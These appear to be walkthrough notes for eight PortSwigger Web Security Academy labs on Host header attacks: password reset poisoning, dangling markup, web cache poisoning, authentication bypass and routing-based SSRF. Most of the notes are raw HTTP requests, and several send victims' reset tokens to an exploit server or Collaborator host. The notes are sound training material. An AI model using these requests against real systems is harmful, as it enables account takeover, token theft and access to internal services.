## Lab - 1: Basic password reset poisoning (A)

- This lab is vulnerable to password reset poisoning. The user carlos will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account. You can log in to your own account using the following credentials: wiener:peter. Any emails sent to this account can be read via the email client on the exploit server.

### how forgot password works in this lab ?

- first test with own account `wiener`
- enter name at forgot password page will make a post request

```
POST /forgot-password HTTP/1.1
Host: 0a2e00ee047f2fdbc0bd31ff00010045.web-security-academy.net
...
csrf=TmWD6yKuj2ZaYbUZkL6sH3f6jom3mvU3&username=wiener
```

- Then `Please check your email for a reset password link.`
- In email box, the following link with token is received.

```
https://0a2e00ee047f2fdbc0bd31ff00010045.web-security-academy.net/forgot-password?temp-forgot-password-token=WLiNjn9NG1CUePEojyt8OtuiaCr3clzi
```

If follow the link, reset password page is received. Then POST request to change the password.

```
POST /forgot-password?temp-forgot-password-token=Hg1GwkdzYSEpDG5FDG5M3gNMULH0vGPS HTTP/1.1
Host: 0a2e00ee047f2fdbc0bd31ff00010045.web-security-academy.net
...

csrf=9FlVx2UgbGDnst1PfLnKjyNdNp2h9wPi&temp-forgot-password-token=Hg1GwkdzYSEpDG5FDG5M3gNMULH0vGPS&new-password-1=peter&new-password-2=peter
```

### How to exploit other user

- test the Host header for POST request with other Hosts

```
POST /forgot-password HTTP/1.1
Host: www.test.com
...
csrf=TmWD6yKuj2ZaYbUZkL6sH3f6jom3mvU3&username=wiener
```

- Email still received with the following link

```
https://www.test.com/forgot-password?temp-forgot-password-token=hZ2261K8u025FraGlCRDl2Gs7RRFMjd0
```

- change the Host header to exploit server and change the user name to other user

```
POST /forgot-password HTTP/1.1
Host: exploit-0a47002904c32fb3c00831f6017b006e.web-security-academy.net/
...
csrf=SOcfxkHQ6D47ls6UbKS5xRvORlFvvlfm&username=carlos
```

- Then look at the exploit server log and found a GET request with token.
- use that token to get the change password page for other user

```
https://0a2e00ee047f2fdbc0bd31ff00010045.web-security-academy.net/forgot-password?temp-forgot-password-token=<token-from-log>
```

---

## Lab - 2: Password reset poisoning via middleware (P)

- This lab is vulnerable to password reset poisoning. The user carlos will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account. You can log in to your own account using the following credentials: wiener:peter. Any emails sent to this account can be read via the email client on the exploit server.

```
POST /forgot-password HTTP/1.1
X-Forwarded-Host: l5r2vxr3alvuvijrao2ocl83puvkj9.burpcollaborator.net
Host: 0a64005403af9d9ac08f879e001900f4.web-security-academy.net
...
username=carlos
```

---

## Lab - 3: Password reset poisoning via dangling markup (E)

- This lab is vulnerable to password reset poisoning via dangling markup. To solve the lab, log in to Carlos's account. You can log in to your own account using the following credentials: wiener:peter. Any emails sent to this account can be read via the email client on the exploit server.

- Host header is vulnerable at adding any arbitary port number and that port number is reflected back in view raw (at user email in box)

```
POST /forgot-password HTTP/1.1
Host: 0ab200920371b631c106b24a007500c9.web-security-academy.net:'><a+href="//exploit-0a8300e5032db65cc101b150010b00eb.exploit-server.net/exploit?token=
...
username=carlos
```

---

## Lab - 4: Web cache poisoning via ambiguous requests (P)

- This lab is vulnerable to web cache poisoning due to discrepancies in how the cache and the back-end application handle ambiguous requests. An unsuspecting user regularly visits the site's home page. To solve the lab, poison the cache so the home page executes alert(document.cookie) in the victim's browser.

- add second Host header with exploit server and see where it is reflected
- in exploit server File path: /resources/js/tracking.js
- in exploit server Body : alert(document.cookie)

---

## Lab 5 : Host header authentication bypass (A)

- This lab makes an assumption about the privilege level of the user based on the HTTP Host header. To solve the lab, access the admin panel and delete Carlos's account.

- admin route can be found at `/admin`

```
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
```

---

## Lab - 6: Routing-based SSRF (P)

- This lab is vulnerable to routing-based SSRF via the Host header. You can exploit this to access an insecure intranet admin panel located on an internal IP address. To solve the lab, access the internal admin panel located in the 192.168.0.0/24 range, then delete Carlos.

- Test the Host header and found that it requests to `burp collaborator`
- in burp intruder

```
GET / HTTP/1.1
Host: 192.168.0.§0§
...
```

- brute force 0 - 255

```
Uncheck the update Host Header to match target (important)
```

- found one IP that will get 302 request to admin
- follow the redirect and found post request to delete the username with CSRF token

```
GET /admin/delete?csrf=rand-string&username=carlos HTTP/1.1
```

- will get invalid CSRF token and took the session cookie from header
- set the cookie and

```
GET /admin HTTP/1.1
```

- get the CSRF token
- with the same cookie and CSRF token and post request to delete carlos

---

## Lab - 7: SSRF via flawed request parsing (P)

- This lab is vulnerable to routing-based SSRF due to its flawed parsing of the request's intended host. You can exploit this to access an insecure intranet admin panel located at an internal IP address. To solve the lab, access the internal admin panel located in the 192.168.0.0/24 range, then delete Carlos.

- same as lab 6 except Host header injection using absolute URL

```
GET https://lab-id.web-security-academy.net
Host: 192.168.0.1
...
```

---

## Lab - 8: Host validation bypass via connection state attack (P)

- This lab is vulnerable to routing-based SSRF via the Host header. Although the front-end server may initially appear to perform robust validation of the Host header, it makes assumptions about all requests on a connection based on the first request it receives. To solve the lab, exploit this behavior to access an internal admin panel located at 192.168.0.1/admin, then delete the user carlos.

- send request to repeater twice and group them
- then change to send group (single connection)
- for one of the request, change

```
GET /admin HTTP/1.1
Host: 192.168.0.1
...
Connection: keep-alive
```

- and send the request together and found the admin panel
- other steps same as above

---
